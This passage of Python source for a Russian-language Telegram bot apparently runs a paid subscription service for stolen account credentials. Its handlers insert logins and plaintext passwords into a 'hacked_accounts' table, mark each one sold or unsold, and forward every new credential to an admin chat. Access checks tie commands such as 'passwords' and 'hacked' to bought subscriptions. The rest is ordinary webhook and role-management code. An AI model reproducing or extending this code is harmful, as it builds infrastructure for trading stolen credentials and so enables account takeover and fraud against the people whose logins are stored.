            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        _, status, login, password = call.data.split('_', 3)
        sold_status = "Продан" if status == "sold" else "Непродан"
        conn = get_db_connection()
        if conn is None:
            try:
                bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
                logger.error("База недоступна")
                bot.answer_callback_query(call.id)
            except Exception as e:
                logger.error(f"Ошибка ответа: {e}")
            return
        try:
            c = conn.cursor()
            c.execute(
                '''
                INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    hack_date = EXCLUDED.hack_date,
                    prefix = EXCLUDED.prefix,
                    sold_status = EXCLUDED.sold_status,
                    linked_chat_id = EXCLUDED.linked_chat_id
                ''',
                (login, password, get_current_time().isoformat(), "Админ", sold_status, chat_id)
            )
            conn.commit()
            response = (
                f"✅ *Аккаунт `{login}` добавлен в hacked!*\n"
                f"🔒 *Пароль*: `{password}`\n"
                f"📊 *Статус*: {sold_status}\n"
                f"🕒 *Время*: {format_time(get_current_time())}"
            )
            bot.send_message(chat_id, response, parse_mode='Markdown')
            try:
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"💾 *Новый взломанный аккаунт*\n"
                    f"👤 *Логин*: `{login}`\n"
                    f"🔒 *Пароль*: `{password}`\n"
                    f"📊 *Статус*: {sold_status}\n"
                    f"🕒 *Добавлено*: {format_time(get_current_time())}\n"
                    f"➕ *Добавил*: {chat_id}",
                    parse_mode='Markdown'
                )
                logger.info(f"Уведомление отправлено админу")
            except Exception as e:
                logger.error(f"Ошибка уведомления админу: {e}")
            logger.info(f"Аккаунт добавлен: {login}, {sold_status}")
        except Exception as e:
            logger.error(f"Ошибка добавления в hacked: {e}")
            bot.send_message(chat_id, "❌ *Ошибка добавления аккаунта!*", parse_mode='Markdown')
        finally:
            conn.close()
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка обработки статуса: {e}")
        bot.send_message(chat_id, "❌ *Ошибка обработки статуса!*", parse_mode='Markdown')
        try:
            bot.answer_callback_query(call.id)
        except Exception as e:
            logger.error(f"Ошибка ответа на callback: {e}")

# Переопределённые функции для исправления ошибок
def get_db_connection():
    logger.info("Подключение к базе")
    try:
        conn = psycopg2.connect(DATABASE_URL, connect_timeout=5)
        logger.info("База подключена")
        return conn
    except Exception as e:
        logger.error(f"Ошибка подключения к базе: {e}")
        return None

def check_access(chat_id, command):
    global tech_mode, tech_end_time
    logger.info(f"Проверка доступа: {chat_id} для {command}")
    user = get_user(chat_id)
    
    # Создатель и ТехПомощник имеют полный доступ
    if user and user['prefix'] in ['Создатель', 'ТехПомощник']:
        logger.debug(f"{user['prefix']} {chat_id} имеет полный доступ")
        return None
    
    # Техперерыв блокирует команды для остальных
    if tech_mode and chat_id != ADMIN_CHAT_ID:
        end_time_str = format_time(tech_end_time)
        logger.warning(f"Техперерыв активен для {chat_id}")
        return (
            f"🛠 *Бот на техническом перерыве!*\n"
            f"📝 *Причина*: {tech_reason or 'Не указана'}\n"
            f"🕒 *Окончание*: {end_time_str}\n"
            f"Попробуйте позже."
        )
    
    # Проверка существования пользователя
    if user is None:
        if command in ['start', 'menu', 'support']:
            logger.info(f"Разрешён {command} для нового пользователя {chat_id}")
            return None
        logger.warning(f"Нет доступа: {chat_id}, команда {command}")
        return "💳 *Купите подписку у @sacoectasy!*"
    
    # Проверка подписки
    try:
        subscription_end = datetime.fromisoformat(user['subscription_end']) if user['subscription_end'] else get_current_time()
        if subscription_end < get_current_time():
            logger.info(f"Подписка истекла для {chat_id}")
            save_user(chat_id, 'Посетитель', get_current_time().isoformat(), chat_id, user['username'])
            return "💳 *Подписка истекла! Обратитесь к @sacoectasy.*"
    except ValueError:
        logger.error(f"Неверный формат subscription_end для {chat_id}")
        return "❌ *Ошибка данных подписки!*"
    
    # Доступ для Посетителей
    if user['prefix'] == 'Посетитель':
        if command in ['start', 'menu', 'support']:
            logger.debug(f"Разрешён {command} для Посетителя {chat_id}")
            return None
        logger.warning(f"Запрещён {command} для Посетителя {chat_id}")
        return "💳 *Купите подписку у @sacoectasy!*"
    
    # Общие команды для подписчиков
    if command in ['passwords', 'hacked', 'getchatid', 'site', 'contact']:
        logger.debug(f"Разрешён {command} для {chat_id}")
        return None
    
    # Админ-команды
    if command in ['database', 'viewdb']:
        if user['prefix'] in ['Админ', 'Создатель', 'ТехПомощник']:
            logger.debug(f"Разрешён {command} для {user['prefix']} {chat_id}")
            return None
    
    # Команды только для Создателя и ТехПомощника
    if command in ['techstop', 'techstopoff', 'adprefix', 'delprefix', 'adduser', 'addcred', 'addhacked', 'broadcast', 'admin', 'messageuser']:
        if user['prefix'] not in ['Создатель', 'ТехПомощник']:
            logger.warning(f"Запрещена команда {command} для {chat_id}")
            return "🔒 *Эта команда только для Создателя или ТехПомощника!*"
    
    logger.debug(f"Разрешён {command} для {chat_id}")
    return None

# Повторение /adprefix и /delprefix для подтверждения уведомлений
@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/adprefix от {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /adprefix: {e}")
        return
    try:
        msg = bot.reply_to(
            message,
            "📝 *Введите chat_id и префикс (через пробел, например: 123456 Админ)*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_adprefix)
        logger.info(f"Запрошен префикс от {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка /adprefix: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

def process_adprefix(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    try:
        target_id, prefix = sanitize_input(message.text).split(maxsplit=1)
        subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
        target_user = get_user(target_id)
        target_username = target_user['username'] if target_user else "Неизвестно"
        save_user(target_id, prefix, subscription_end, target_id, target_username)
        bot.reply_to(
            message,
            f"✅ *Подписка выдана для `{target_id}`!*\n🔑 *Префикс*: `{prefix}`",
            parse_mode='Markdown'
        )
        try:
            bot.send_message(
                target_id,
                f"🎉 *Ваш префикс обновлён!*\n🔑 *Новый префикс*: `{prefix}`\n🕒 *Подписка до*: {format_time(datetime.fromisoformat(subscription_end))}",
                parse_mode='Markdown'
            )
            logger.info(f"Уведомление о префиксе отправлено {target_id}")
        except Exception as e:
            logger.error(f"Ошибка уведомления {target_id}: {e}")
        logger.info(f"Выдан префикс: {target_id}, {prefix}")
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except ValueError:
        logger.warning("Неверный формат ввода")
        bot.reply_to(
            message,
            "❌ *Формат: chat_id префикс (например: 123456 Админ)*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка префикса: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/delprefix от {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        try:
            bot.reply_to(message, access, parse_mode='Markdown')
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /delprefix: {e}")
        return
    try:
        msg = bot.reply_to(
            message,
            "📝 *Введите chat_id и причину удаления (через пробел, например: 123456 Нарушение)*:",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(msg, process_delprefix)
        logger.info(f"Запрошено удаление префикса от {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка /delprefix: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

def process_delprefix(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    try:
        target_id, reason = sanitize_input(message.text).rsplit(maxsplit=1)
        target_user = get_user(target_id)
        if not target_user:
            bot.reply_to(message, "❌ *Пользователь не найден!*", parse_mode='Markdown')
            logger.warning(f"Пользователь не найден: {target_id}")
            return
        target_username = target_user['username'] or "Неизвестно"
        save_user(target_id, "Посетитель", get_current_time().isoformat(), target_id, target_username)
        bot.reply_to(
            message,
            f"✅ *Подписка для `{target_id}` сброшена до `Посетитель`!*\n📝 *Причина*: {reason}",
            parse_mode='Markdown'
        )
        try:
            bot.send_message(
                target_id,
                f"⚠️ *Ваш префикс сброшен до `Посетитель`!*\n📝 *Причина*: {reason}",
                parse_mode='Markdown'
            )
            logger.info(f"Уведомление о сбросе отправлено {target_id}")
        except Exception as e:
            logger.error(f"Ошибка уведомления {target_id}: {e}")
        logger.info(f"Сброшена подписка: {target_id}, причина: {reason}")
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except ValueError:
        logger.warning("Неверный формат ввода")
        bot.reply_to(
            message,
            "❌ *Формат: chat_id причина (например: 123456 Нарушение)*",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ошибка сброса префикса: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# Запуск бота
def start_bot():
    logger.info("Запуск бота")
    try:
        bot.remove_webhook()
        time.sleep(1)
        bot.set_webhook(url=f"{SITE_URL}/webhook", secret_token=SECRET_WEBHOOK_TOKEN)
        logger.info(f"Вебхук установлен: {SITE_URL}/webhook")
    except Exception as e:
        logger.error(f"Ошибка установки вебхука: {e}")
        return
    threading.Thread(target=keep_alive, daemon=True).start()
    logger.info("Keep_alive запущен")
    if init_db():
        logger.info("База данных инициализирована")
    else:
        logger.error("Не удалось инициализировать базу")
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))

if __name__ == '__main__':
    start_bot()
